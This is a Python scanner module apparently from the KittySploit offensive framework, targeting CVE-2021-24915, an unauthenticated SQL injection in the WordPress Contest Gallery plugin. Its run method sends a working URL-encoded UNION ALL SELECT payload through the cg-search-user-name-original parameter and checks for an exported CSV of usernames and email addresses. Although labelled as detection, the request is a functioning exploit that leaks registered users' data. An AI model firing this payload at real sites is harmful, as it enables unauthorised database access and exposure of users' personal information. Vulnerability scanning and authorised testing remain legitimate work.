#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The plugin does not have capability checks and does not sanitise or escape the cg-search-user-name-original pa."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Contest Gallery < 13.1.0.6 - SQL injection Detection',
        'description': 'The plugin does not have capability checks and does not sanitise or escape the cg-search-user-name-original parameter before using it in a SQL statement when exporting users from a gallery, which could allow unauthenticated to perform SQL injections attacks, as well as get the list of all users registered on the blog, including their username and email address.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'wordpress', 'wp-plugin', 'wpscan', 'wp', 'contest-gallery', 'contest_gallery', 'sqli', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/45ee86a7-1497-4c81-98b8-9a8e5b3d4fac',
            'https://gist.github.com/tpmiller87/6c05596fe27dd6f69f1aaba4cbb9c917',
            'https://wordpress.org/plugins/contest-gallery/',
        ],
        'cve': 'CVE-2021-24915',
    }

    def run(self):
        path = '/wp-admin/admin.php?page=contest-gallery/index.php&users_management=true&option_id=1'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='cg-search-user-name=&cg-search-user-name-original=%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x717a6b7871%2CIFNULL%28CAST%28VERSION%28%29%20AS%20NCHAR%29%2C0x20%29%2C0x716b707871%29%2CNULL--%20-&cg_create_user_data_csv_new_export=true&cg-search-gallery-id-original=&cg-search-gallery-id=&cg_create_user_data_csv=true\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('WpUserId', 'Username', 'Usermail',)
        header_any = ('text/csv', 'filename=',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='Contest Gallery < 13.1.0.6 - SQL injection detected', path=path)
            return True
        return False

